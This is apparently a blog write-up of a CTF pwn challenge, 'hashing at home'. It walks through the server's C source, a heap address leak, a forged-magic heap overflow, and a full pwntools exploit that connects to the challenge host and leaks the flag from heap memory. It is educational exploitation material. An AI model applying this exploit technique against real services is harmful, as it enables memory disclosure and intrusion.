@@ -1,0 +1,223 @@
+I"�e<p>We had a lot of fun solving this challenge and were so close to solving the challege but we couldnt get the pun that the description was trying to make. Anyways , jokes apart , following is the intended solution for this challenege.</p>
+
+<h2 id="description">Description</h2>
+
+<p>We have been provided with the source code running on the <strong>server</strong> side as well as the client side.</p>
+
+<h2 id="source-code-analysis">Source Code Analysis</h2>
+
+<p>Initially , let’s compile the source with <code class="language-plaintext highlighter-rouge">gcc -o server server.c</code>.</p>
+
+<p>The source code of the server binary is pretty straight forward.</p>
+
+<p>The main function reads 3 arguments.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span>
+            <span class="s">"Usage: hashing_at_home_server key_bytes records_file output_file</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"This software reads a file in chunks, hashes these chunks many times</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"and then combine the hashes and hash them again for extra secureness.</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"Unfortunately, this is resource-intensive, so it uses a networked worker</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"to do the hash rounds in parallel.</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+            <span class="s">"(TEST VERSION USING STDIO. use xinetd or something to make it networked)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+    <span class="n">strncpy</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">63</span><span class="p">);</span>
+    <span class="n">read_input</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+    <span class="n">do_the_work</span><span class="p">();</span>
+    <span class="n">write_output</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>The first Argument is the string that is stored on the heap with a <em>calloc</em> call of 64 bytes.</li>
+  <li>The Second Argument is a <strong>char pointer</strong> to the <em>read_input</em> function.</li>
+  <li>The Third Argument is also a <em>char pointer</em> to the <em>write_output</em> function.</li>
+</ul>
+
+<p>There are constants defined.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define ROUNDS 100
+#define CHUNK_SIZE 32
+#define CONTEXT_MAGIC 0x6861736822686f6dULL
+</span>
+</code></pre></div></div>
+
+<p>The <em>read_input</em> function creates a structure for each allocated chunk.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">read_input</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">filename</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">record</span><span class="p">[</span><span class="n">CHUNK_SIZE</span><span class="p">];</span>
+    <span class="n">hash_rpc_context</span> <span class="o">*</span> <span class="n">previous</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">record</span><span class="p">,</span><span class="n">CHUNK_SIZE</span><span class="p">)</span><span class="o">==</span><span class="n">CHUNK_SIZE</span><span class="p">){</span>
+        <span class="n">hash_rpc_context</span> <span class="o">*</span><span class="n">context</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hash_rpc_context</span><span class="p">));</span>
+        <span class="n">context</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">=</span> <span class="n">CONTEXT_MAGIC</span><span class="p">;</span>
+        <span class="n">context</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">previous</span><span class="p">;</span>
+        <span class="n">context</span><span class="o">-&gt;</span><span class="n">rounds_left</span> <span class="o">=</span> <span class="n">ROUNDS</span><span class="p">;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">CHUNK_SIZE</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+            <span class="n">context</span><span class="o">-&gt;</span><span class="n">data_to_hash</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">record</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+        <span class="n">previous</span> <span class="o">=</span> <span class="n">context</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">first_context</span> <span class="o">=</span> <span class="n">previous</span><span class="p">;</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Subsequently , the <em>read_input</em> opens the file with name that was passed as second argument to the binary and then callocs chunks of size 32 bytes until the entire data from the file is read and then xors the content of file with the initial argument that was passed into the binary which obviously is hidden from our site.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">do_the_work</span><span class="p">(){</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">hash_rpc_context</span><span class="o">*</span> <span class="n">context</span> <span class="o">=</span> <span class="n">first_context</span><span class="p">;</span> <span class="n">context</span><span class="p">;</span> <span class="n">context</span> <span class="o">=</span> <span class="n">context</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">){</span>
+        <span class="n">send_request</span><span class="p">(</span><span class="n">context</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">while</span><span class="p">(</span><span class="n">first_context</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">receive_response</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function iterates over all chunks and calls the function <em>send_request</em>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">send_request</span><span class="p">(</span><span class="k">const</span> <span class="n">hash_rpc_context</span><span class="o">*</span> <span class="n">request_context</span><span class="p">){</span>
+    <span class="cm">/* XXX: the request's pointer is used as the request ID
+     * maybe this should be an UUID? */</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request_context</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request_context</span><span class="p">));</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">request_context</span><span class="o">-&gt;</span><span class="n">data_to_hash</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function writes the content of all the user input chunks one by one by iterating through the linked list of all heap chunks except the very first one.</p>
+
+<p>The first write prints <strong>heap address</strong> and hence we have Heap Leak with no efforts :P.</p>
+
+<p>Thereafter , in the while loop of <em>do_the_work</em> function which executes till <em>first_context-&gt;next</em> is <strong>NULL</strong> and calls the function <em>recieve_response</em>.</p>
+
+<h2 id="the-idea-of-exploitation">The Idea of Exploitation</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">void</span> <span class="nf">receive_response</span><span class="p">(){</span>
+    <span class="n">hash_rpc_context</span><span class="o">*</span> <span class="n">request_context</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">response_data</span><span class="p">[</span><span class="n">CHUNK_SIZE</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request_context</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request_context</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">request_context</span><span class="p">)){</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">response_data</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">)</span> <span class="o">!=</span> <span class="n">CHUNK_SIZE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">request_context</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">!=</span> <span class="n">CONTEXT_MAGIC</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">process_response</span><span class="p">(</span><span class="n">request_context</span><span class="p">,</span> <span class="n">response_data</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Here , we have arbitrary write , but how??
+We have two reads being called <em>read(0, &amp;request_context, sizeof(request_context))</em> and <em>read(0, response_data, CHUNK_SIZE)</em> both of which take user input from <strong>STDIN</strong> and then check whether the <code class="language-plaintext highlighter-rouge">*(request_context+8)==CONTEXT_MAGIC</code> and then calls the function <em>process_response</em>.</p>
+
+<p>Initially we would not trigger the <em>process_response</em> function if we give some random input but dont’t forget we have heap leaks all of which come from the structure that we saw earlier and hence passing a heap address we leaked could get us ahead into the <em>process_request</em> function.</p>
+
+<p>Now comes the interesting part.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">process_response</span><span class="p">(</span><span class="n">hash_rpc_context</span><span class="o">*</span> <span class="n">request_context</span><span class="p">,</span> <span class="kt">char</span> <span class="n">response_data</span><span class="p">[</span><span class="n">CHUNK_SIZE</span><span class="p">]){</span>
+    <span class="o">--</span><span class="n">request_context</span><span class="o">-&gt;</span><span class="n">rounds_left</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">request_context</span><span class="o">-&gt;</span><span class="n">rounds_left</span><span class="p">){</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">request_context</span><span class="o">-&gt;</span><span class="n">data_to_hash</span><span class="p">,</span> <span class="n">response_data</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
+        <span class="n">send_request</span><span class="p">(</span><span class="n">request_context</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span>
+            <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">&amp;&amp;</span>
+            <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">rounds_left</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
+            <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">rounds_left</span> <span class="o">==</span> <span class="mi">0</span>
+        <span class="p">){</span>
+            <span class="n">hash_together_the_first_two</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Awesome!! We have a memcpy here which copies <em>response_data</em> [We control] to <em>request_context-&gt;data_to_hash</em> [Also in our control].
+e
+Hence , now we have almost arbitrary write on heap and stack also [But we dont have stack leak].
+Ok , so the first idea that popped into my mind was , we could write on heap and fake its structure.
+What if we write the <em>CONTEXT_MAGIC</em>  somewhere else on the heap , then we could take a pointer 8 bytes off the place we wrote <em>CONTEXT_MAGIC</em> to and easily trigger <strong>heap overflow</strong>.</p>
+
+<p>By triggering the heap overflow , we can overwrite the structure of the next chunk. 
+But what advantage does this give us??</p>
+<ul>
+  <li>We dont have Free call anywhere.</li>
+  <li>We dont have any unlink anywhere.</li>
+  <li>All we have is we can read data from almost anywhere on heap.</li>
+</ul>
+
+<p>In response to all the information we had at the moment , I began searching for libc pointers on heap [if any] but found nothing to my disappointment :(.</p>
+
+<p>This is where we were stuck during the CTF thinking of various possibilities of leaking libc and overwriting stack return address as we could trigger stack overflow also ,given we had a stack leak.</p>
+
+<p>One interesting thing is that , we could craft the location of <em>CONTEXT_MAGIC</em> in such a way that , if we had a stack leak , we could easily bypass canary and get to the saved EIP.</p>
+
+<p>Thereafter , we were totally puzzled as to how we should move forward with exploitation.
+The server side binary had <strong>jemalloc</strong> implemenated. This caught our attention.
+Considering this possibility that the further exploitation could be related to jemalloc, we started reading through internals of jemalloc without any luck.</p>
+
+<h2 id="the-final-exploit">The final Exploit</h2>
+
+<p>If we observe the <em>process_response</em> function there’s an if condition which on returning true , calls a mysterious function , <em>hash_together_the_first_two</em>.</p>
+
+<p>As we have heap overflow , we can satisfy the constraints of the if conditions and call that function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">hash_together_the_first_two</span><span class="p">(){</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">CHUNK_SIZE</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
+        <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">data_to_hash</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">data_to_hash</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="cm">/* TODO: free the first context. It crashes for some reason sometimes though */</span>
+    <span class="n">first_context</span> <span class="o">=</span> <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="n">first_context</span><span class="o">-&gt;</span><span class="n">rounds_left</span> <span class="o">=</span> <span class="n">ROUNDS</span><span class="p">;</span>
+    <span class="n">send_request</span><span class="p">(</span><span class="n">first_context</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>This function xors the data of <code class="language-plaintext highlighter-rouge">current_chunk</code> with the data of the <code class="language-plaintext highlighter-rouge">current_chunk-&gt;next</code>.
+Then , it updates the <code class="language-plaintext highlighter-rouge">first_context</code> to <code class="language-plaintext highlighter-rouge">first_context-&gt;next</code>.
+Note that <code class="language-plaintext highlighter-rouge">first_context</code> is the chunk most recently allocated and we could overwrite its <code class="language-plaintext highlighter-rouge">fd</code> by overflowing from the chunk just above it.</p>
+
+<p>If we overwrite the fd of the <code class="language-plaintext highlighter-rouge">first_context</code> chunk with the heap address of <code class="language-plaintext highlighter-rouge">key_bytes</code>[the very first allocated chunk on heap] , we can view it’s contents.</p>
+
+<p>On server , the contents of only the first argument are hidden so we try to leak them also.
+And eventually , it turns out that , the <code class="language-plaintext highlighter-rouge">key_bytes</code> were nothing but the flag.</p>
+
+<p>Here is the complete exploit.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+ 
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'35.230.128.35'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+<span class="n">magic</span> <span class="o">=</span> <span class="mh">0x6861736822686f6d</span>
+ 
+<span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+    <span class="n">ptr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">ptr</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ptr</span>
+ 
+<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">d0</span><span class="p">,</span> <span class="n">d1</span><span class="p">,</span> <span class="n">d2</span><span class="p">,</span> <span class="n">d3</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ptr</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">d0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">d1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">d2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">d3</span><span class="p">))</span>
+ 
+<span class="n">reqs</span> <span class="o">=</span> <span class="p">[</span><span class="n">read</span><span class="p">()</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)]</span>
+<span class="c1">#Print contents of entire heap eventually printing flag also
+</span><span class="n">send</span><span class="p">(</span><span class="n">reqs</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">read</span><span class="p">()</span>
+<span class="n">send</span><span class="p">(</span><span class="n">reqs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">magic</span><span class="p">)</span>
+<span class="n">read</span><span class="p">()</span>
+<span class="n">send</span><span class="p">(</span><span class="n">reqs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">reqs</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">-</span> <span class="mi">3</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">read</span><span class="p">()</span>
+<span class="n">send</span><span class="p">(</span><span class="n">reqs</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">read</span><span class="p">()</span>
+</code></pre></div></div>
+
+:ET
